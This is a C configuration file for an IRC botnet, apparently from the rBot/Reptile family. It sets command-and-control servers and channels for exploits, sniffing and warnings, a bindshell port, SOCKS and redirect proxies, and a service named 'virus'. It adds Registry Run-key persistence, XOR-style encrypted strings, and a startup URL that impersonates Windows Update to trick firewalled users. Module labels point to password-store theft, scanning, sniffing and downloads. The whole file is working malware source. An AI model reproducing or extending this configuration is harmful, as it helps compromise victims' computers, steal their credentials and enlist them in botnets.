
char mutexhandle[]		= "0xFFFFFFFF";//*mutex handle

#ifndef _DEBUG
char botid[]			= "0.37";				//*bot id
#else
char botid[]			= "debug";
#endif

unsigned short ftpdport	= 8082;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 8069;					// socks4 port
unsigned short redirport= 8060;					// redirect local port
unsigned short bindport = 4460;					//*bindshell port most of the exploits use

char prefix				= '.';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\rlog.txt";
char debug_log_mode[]	= "a+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
#ifndef NO_CRYPT // Encrypted
//--------------------------------------------------------------------------------------------------------

	char filename[]			= "\x57\x48\x91\x50\x1E\x8F\xA7\x7F\xF8\x74\x1B";

#ifndef NO_FCONNECT
	char cononstart[]		= "\x4C\x58\x8E\x54\x41\xCD\xF8\x26\xF4\x62\x1A\xC5\x59\x77\xDA\xB8\xDB\x8E\x72\xC2\x83\xB3\xE5\x24\xBF\x3A\xA8\x9E\x9E\x65\x3F\xFF\x99\xB2\x9B";
#endif

	char version[]			= "\x76\x49\x8A\x50\x12\x8E\xB2";

#ifndef NO_SERVICE
	char servicename[]		= "\x57\x48\x91\x50\x1E\x8F\xA7";
	char servicedisplayname[]="\x57\x48\x91\x50\x1E\x8F\xA7";
	char servicedesc[]		= "\x74\x40\x9B\x50\x1D\x8D\xA5\x3C\xBD\x5F\x3A\xE1\x0E\x41\xC1\xBE\xD6\x9D\x69\xCA\xC8\xB0\xF8";
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93", "\x74\x7F\xB1\x60\x2F\xA7\x9A\x01" };
#endif

	char password[]			= "\x56\x1C\x9C\x48\x01";
	
#ifdef _DEBUG
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\x0E\x0D\x82\x1C\x4B\xA2\xA5\x3E\xFB\x60\x50\xC7\x47\x68";//*!*@*
	char authhost2[] = "\x0E\x0D\x82\x1C\x4B\xA2\xA5\x3E\xFB\x60\x50\xC7\x47\x68";//*!*@*
	char authhost3[] = "\x0E\x0D\x82\x1C\x4B\xA2\xA5\x3E\xFB\x60\x50\xC7\x47\x68";//*!*@*
	char *authost[] = { authhost1, authhost2, authhost3 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\x49\x65\xA8\x67\x5B\x94\xE1\x7F\xAC\x38\x5E\xE1\x46\x65\xC3\xAD\xDB\xCF\x4B\xC6\xDF\xBA\xED\x2A\xE0\x17\xBE\x88";
	char *versionlist[] = { versionlist1 };
#endif

	SERVER servers[]={
		{   
			"\x49\x56\xD4\x4B\x0E\x81\xBE\x39\xFC\x74\x50\xC3\x40\x62\xC0",//server
			"",//pass
			27999,//port
			FALSE,//ssl
			"\x07\x41\x89\x4A\x08",//mainchan
			"\x49\x5F\x94\x57",//key
			"",//modeonconn
			"",//modeonjoin
			"\x07\x41\x89\x4A\x56\x91",//exploitchan - #exp
			"\x07\x5F\x94\x4D\x1D\x84",//sniffchan - #sniff
			"\x07\x5B\x9B\x56\x15"//warnchan - #warn
		},
	};

#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x69\x49\x96\x50\x36\x87" };
#endif
#ifndef NO_RECORD_UPTIME
	REGENT rupkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x76\x49\x99\x4B\x09\x86" };
#endif
#ifndef NO_INSTALLED_TIME
	REGENT itkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x6D\x42\x89\x50\x1A\x8E\xBB\x34\xF9\x2C\x2A\xC3\x43\x61" };
#endif

//--------------------------------------------------------------------------------------------------------
#else // Not encrypted
//--------------------------------------------------------------------------------------------------------

#ifndef _DEBUG
	char filename[]			= "virus.exe";			// bot filename (keep even if random fname is enabled (for fname len))
#else
	char filename[]			= "virus_d.exe";		// bot filename (keep even if random fname is enabled (for fname len))
#endif // _DEBUG

#ifndef NO_FCONNECT
	char cononstart[]		= "http://windowsupdate.microsoft.com/";// open this url on startup to try to get
#endif																// firewalled people to click yes

	char version[]			= "Reptile.[small].DMG.Fixes.0x1FE";			// public bot version

	#ifdef _DEBUG
	char *authost[] = { "*!*@*" };
	#else
	char *authost[]			= {						// auth hosts
	//	"nick!ident@host",
		"*!*@*",
	};
	#endif


	char *versionlist[]		= {						// version list
		"mIRC v6.14 Khaled Mardam-Bey",
	};


#ifndef NO_SERVICE
	char servicename[]		= "virus";
	char servicedisplayname[]="change me";
	char servicedesc[]		= "go to hell";
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "virus" };
#endif

	char password[]			= "pass";				// bot password
	
	BOOL bmodeonjoin		= FALSE;

	SERVER servers[]={
		{
			"127.0.0.1"//server
			"",//pass
			6667,//port
			FALSE,//ssl
			"#0x1",//mainchan
			"key",//key
			"",//modeonconn
			"",//modeonjoin
			"#exp",//exploitchan
			"#sniff",//sniffchan
			"#warn"//warnchan
		},
	};

	#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions", "MeltMe" };
	#endif
	#ifndef NO_RECORD_UPTIME
	REGENT rupkey=	{ HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions", "Record" };
	#endif
	#ifndef NO_INSTALLED_TIME
	REGENT itkey=	{ HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions", "Installed Time" };
	#endif

//--------------------------------------------------------------------------------------------------------
#endif
//--------------------------------------------------------------------------------------------------------

char main_title[]		= "MAIN//";
char threads_title[]	= "THREADS//";
char process_title[]	= "PROC//";
char irc_title[]		= "IRC//";
char sec_title[]		= "SECURE//";
char unsec_title[]		= "UNSECURE//";
char scan_title[]		= "SCAN//";
char ftp_title[]		= "FTP//";
char netinfo_title[]	= "NETINFO//";
char sysinfo_title[]	= "SYSINFO//";
char drives_title[]		= "DRIVES//";
char mirc_title[]		= "MIRC//";
char file_title[]		= "FILE//";
char download_title[]	= "DOWNLOAD//";
char update_title[]		= "UPDATE//";
char logic_title[]		= "LOGIC//";
char reg_title[]		= "REG//";
char pstore_title[]		= "PSTORE//";
char netstatp_title[]	= "NETSTATP//";
char sniffer_title[]	= "SNIFFER//";
char tcp_title[]		= "TCP//";
char udp_title[]		= "UDP//";
char speedtest_title[]	= "SPEEDTEST//";
char sock4_title[]		= "SOCKS4//";
char redirect_title[]	= "REDIRECT//";
char warn_title[]		= "\2WARN\2//";
